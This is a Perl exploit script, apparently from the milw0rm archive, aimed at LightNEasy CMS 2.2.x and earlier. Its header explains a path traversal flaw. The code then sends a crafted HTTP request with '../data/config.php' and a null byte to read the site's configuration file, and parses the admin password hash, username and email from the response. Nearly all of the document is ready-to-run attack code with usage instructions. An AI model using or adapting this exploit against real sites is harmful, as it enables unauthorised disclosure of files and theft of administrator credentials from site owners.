#!/usr/bin/perl
#
# LightNEasy sql/no-db <= 2.2.x system config disclosure exploit
#
# by staker
# ------------------------------
# mail: staker[at]hotmail[dot]it
# url: http://www.lightneasy.org
# ------------------------------
#
# it works with magic_quotes_gpc=off
#
# short explanation:
#
# -----------------------------------------------------
# LightNEasy contains one flaw that allows an attacker
# to disclose a local file because of file_get_contents
# it's possible to retrieve the configuration file
# passing as argument '../data/config.php'. Example:
# http://[host]/LightNEasy.php?page=../data/config.php
# ----------------------------------------------------
# Today is: 09 June 2009
# Location: Italy,Turin.
# http://www.youtube.com/watch?v=uXN0pE2Hdt8
# ----------------------------------------------------

use IO::Socket;


my $domain = $ARGV[0] || &usage;


launch_cmd("../data/config.php"); # if you wanna disclose another file,change it


sub launch_cmd()
{
      my ($data,$result,$html);

      my $page = $_[0] || die $!;
      my $path = socket_url($domain,'path');
      my $host = socket_url($domain,'host');

      my $TCP = IO::Socket::INET->new(
                                       PeerAddr => $host,
                                       PeerPort => 80,
                                       Proto    => 'tcp',
                                     ) || die $!;

      $data .= "GET /$path/LightNEasy.php?page=$page%00 HTTP/1.1\r\n";
      $data .= "Host: $host\r\n";
      $data .= "User-Agent: Lynx (textmode)\r\n";
      $data .= "Connection: close\r\n\r\n";

      $TCP->send($data);

      while (<$TCP>) {
            $html .= $_;
      }

      if ($html =~ /password']="([0-9a-f]{40})"/i) {
            $result .= "Password: $1\n";
      }
      if ($html =~ /fromname']="(.+?)"/i) {
            $result .= "Username: $1\n";
      }
      if ($html =~ /toemail']="(.+?)"/i) {
            $result .= "E-Mail: $1\n";
      }

      print $result;
}


sub socket_url()
{
           my ($url,$ext) = @_;

           $url =~ s/http:\/\/// if $url =~ /^http:\/\/(.+?)+$/i;

           @GLOBALS = split /\//,$url;

           if ($ext eq 'host') {
                return $GLOBALS[0];
           }
           elsif ($ext eq 'path') {
                return $GLOBALS[1];
           }
           else {
                return join('/',@GLOBALS);
           }
}


sub parse_url
{
        my $string = shift @_ || die($!);

        if ($string !~ /^http:\/\/?/i) {
                $string = 'http://'.$string;
        }

        return $string;
}


sub usage()
{
       print  "[*------------------------------------------------------------*]\n".
              "[* LightNEasy sql/no-db < 2.2.x sys config disclosure exploit *]\n".
              "[*------------------------------------------------------------*]\n".
              "[* Usage: perl light.pl [domain]                              *]\n".
              "[* [domain] domain -> http://localhost/lightneasy             *]\n".
              "[*------------------------------------------------------------*]\n";
      exit;
}

# milw0rm.com [2009-06-10]